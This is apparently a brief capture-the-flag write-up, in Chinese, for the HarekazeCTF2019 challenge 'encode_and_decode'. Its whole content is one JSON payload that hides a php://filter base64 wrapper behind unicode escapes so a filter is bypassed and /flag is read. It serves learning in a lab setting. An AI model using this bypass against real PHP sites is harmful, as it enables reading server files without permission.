# HarekazeCTF2019

## encode_and_decode

利用点： json unicode 字符bypass

payload

```json
{
	"page":"ph\u0070://filter/convert.base64-encode/resource=/\u0066lag"
}
```